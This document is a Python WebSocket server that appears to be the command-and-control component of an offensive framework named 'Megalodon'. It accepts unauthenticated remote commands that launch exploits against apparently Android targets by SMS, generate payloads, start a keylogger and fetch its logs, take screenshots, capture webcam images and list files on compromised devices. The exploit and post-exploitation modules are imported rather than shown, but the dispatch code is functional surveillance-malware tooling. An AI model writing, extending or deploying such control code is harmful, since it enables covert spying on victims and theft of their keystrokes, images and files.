import json
import asyncio
import websockets
from pathlib import Path
import time
import threading

class WebSocketServer:
    
    def __init__(self, host='0.0.0.0', port=8765):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = False
        self.server = None
    
    def start(self):
        """Start the WebSocket server"""
        self.running = True
        print(f"[+] WebSocket server starting on ws://{self.host}:{self.port}")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.run_server())
    
    async def run_server(self):
        """Run the WebSocket server"""
        async with websockets.serve(self.handle_client, self.host, self.port):
            print(f"[+] WebSocket server running on ws://{self.host}:{self.port}")
            await asyncio.Future()  # Run forever
    
    async def handle_client(self, websocket, path):
        """Handle a client connection"""
        client_id = f"client_{int(time.time())}"
        self.clients[client_id] = {
            'websocket': websocket,
            'connected': time.time(),
            'last_activity': time.time()
        }
        
        print(f"[+] WebSocket client connected: {client_id}")
        
        try:
            await websocket.send(json.dumps({
                'type': 'connection',
                'status': 'connected',
                'message': 'Connected to Megalodon WebSocket Server'
            }))
            
            async for message in websocket:
                self.clients[client_id]['last_activity'] = time.time()
                await self.handle_message(websocket, message, client_id)
                
        except websockets.exceptions.ConnectionClosed:
            print(f"[-] Client {client_id} disconnected")
        finally:
            del self.clients[client_id]
    
    async def handle_message(self, websocket, message, client_id):
        """Handle incoming WebSocket messages"""
        try:
            data = json.loads(message)
            message_type = data.get('type', 'unknown')
            
            print(f"[*] Received {message_type} from {client_id}")
            
            if message_type == 'command':
                command = data.get('command')
                result = self.execute_command(command, data.get('params', {}))
                await websocket.send(json.dumps({
                    'type': 'command_result',
                    'command': command,
                    'result': result
                }))
            
            elif message_type == 'screen_stream':
                await websocket.send(json.dumps({
                    'type': 'screen_stream',
                    'status': 'starting',
                    'message': 'Screen stream starting...'
                }))
            
            elif message_type == 'webcam_stream':
                await websocket.send(json.dumps({
                    'type': 'webcam_stream',
                    'status': 'starting',
                    'message': 'Webcam stream starting...'
                }))
            
            else:
                await websocket.send(json.dumps({
                    'type': 'error',
                    'message': f'Unknown message type: {message_type}'
                }))
                
        except json.JSONDecodeError:
            await websocket.send(json.dumps({
                'type': 'error',
                'message': 'Invalid JSON format'
            }))
    
    def execute_command(self, command, params):
        """Execute commands from WebSocket"""
        try:
            if command == 'ping':
                return {'status': 'pong', 'time': time.time()}
            
            elif command == 'get_target':
                from core.framework import Megalodon
                megalodon = Megalodon()
                status = megalodon.get_status()
                return {'target': status.get('target')}
            
            elif command == 'run_exploit':
                from core.framework import Megalodon
                megalodon = Megalodon()
                method = params.get('method', 'sms')
                result = megalodon.run_exploit(method)
                return result
            
            elif command == 'generate_payload':
                from core.framework import Megalodon
                megalodon = Megalodon()
                os_type = params.get('os', 'android')
                result = megalodon.generate_payload(os_type)
                return result
            
            elif command == 'take_screenshot':
                from modules.post_exploit.screenshot_capture import run
                result = run()
                return result
            
            elif command == 'start_keylogger':
                from modules.post_exploit.keylogger import start
                result = start()
                return result
            
            elif command == 'get_keylogs':
                from modules.post_exploit.keylogger import get_logs
                result = get_logs()
                return result
            
            elif command == 'capture_webcam':
                from modules.post_exploit.webcam_capture import run
                result = run()
                return result
            
            elif command == 'list_files':
                from modules.post_exploit.file_manager import list_files
                result = list_files(params.get('path', '/'))
                return result
            
            else:
                return {'error': f'Unknown command: {command}'}
                
        except Exception as e:
            return {'error': str(e)}
    
    def broadcast(self, message):
        """Broadcast message to all clients"""
        for client_id, client in self.clients.items():
            try:
                asyncio.run_coroutine_threadsafe(
                    client['websocket'].send(json.dumps(message)),
                    asyncio.get_event_loop()
                )
            except:
                pass
    
    def stop(self):
        """Stop the WebSocket server"""
        self.running = False
        for client_id in list(self.clients.keys()):
            try:
                self.clients[client_id]['websocket'].close()
            except:
                pass
        print("[+] WebSocket server stopped")

def start_server(host='0.0.0.0', port=8765):
    server = WebSocketServer(host, port)
    thread = threading.Thread(target=server.start, daemon=True)
    thread.start()
    return server

if __name__ == "__main__":
    server = WebSocketServer()
    server.start()
